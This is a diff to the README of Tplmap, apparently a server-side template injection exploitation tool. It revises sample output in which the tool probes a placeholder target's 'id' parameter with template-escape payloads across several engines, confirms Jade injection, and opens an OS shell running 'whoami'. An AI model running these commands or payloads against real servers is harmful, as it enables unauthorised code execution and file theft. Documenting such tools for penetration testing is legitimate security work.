@@ -15,23 +15,35 @@ Example
 --------
 
 ```
-$ ./tplmap.py -u 'http://www.target.com/app?id=*' --level 2
+$ ./tplmap.py -u 'http://www.target.com/app?id=*' 
+[[+] Tplmap 0.1b
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
 [+] Found placeholder in GET parameter 'id'
-[+] Testing reflection on Mako engine with tag ${*} and 13 variations
-[+] Testing reflection on Jinja2 engine with tag {{*}} and 9 variations
-[+] Testing reflection on Twig engine with tag {{*}} and 1 variation
-[+] Testing reflection on Smarty engine with tag {*} and 1 variation
-[+] Testing reflection on Freemarker engine with tag ${*} and 1 variation
-[+] Testing reflection on Velocity engine with tag #set($p=*)\n${p}\n
-[+] Detected unreliable reflection with tag #set($p=*)\n${p}\n, continuing
-[+] Testing reflection on Jade engine with tag \n= *\n
-[+] Confirmed reflection with tag '\n= *\n' by Jade plugin
+[+] Smarty plugin is testing reflection on text context with tag {*}
+[+] Smarty plugin is testing }*{ code context escape with 6 mutations
+[+] Mako plugin is testing reflection on text context with tag ${*}
+[+] Mako plugin is testing }* code context escape with 6 mutations
+[+] Mako plugin is testing %>*<%# code context escape with 6 mutations
+[+] Jinja2 plugin is testing reflection on text context with tag {{*}}
+[+] Jinja2 plugin is testing }}* code context escape with 6 mutations
+[+] Jinja2 plugin is testing %}* code context escape with 6 mutations
+[+] Twig plugin is testing reflection on text context with tag {{*}}
+[+] Twig plugin is testing }}*{{1 code context escape with 6 mutations
+[+] Twig plugin is testing  %}* code context escape with 6 mutations
+[+] Freemarker plugin is testing reflection on text context with tag ${*}
+[+] Freemarker plugin is testing }* code context escape with 6 mutations
+[+] Velocity plugin is testing reflection on text context with tag #set($p=*)\n${p}\n
+[+] Velocity plugin is testing )* code context escape with 6 mutations
+[+] Velocity plugin has detected unreliable reflection with tag #set($p=*)\n${p}\n, skipping
+[+] Jade plugin is testing reflection on text context with tag \n= *\n
+[+] Jade plugin has confirmed injection with tag '\n= *\n'
 [+] Tplmap identified the following injection point:
 
   Engine: Jade
   Template: \n= *\n
   Context: text
-  OS: linux
+  OS: darwin
   Capabilities:
     Code evaluation: yes, javascript code
     OS command execution: yes
@@ -42,7 +54,7 @@ $ ./tplmap.py -u 'http://www.target.com/app?id=*' --level 2
     --os-cmd or --os-shell to access the underlying operating system
     --upload LOCAL REMOTE to upload files to the server
     --download REMOTE LOCAL to download remote files
-
+    
 $ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
 [+] Run commands on the operating system.
 linux $ whoami
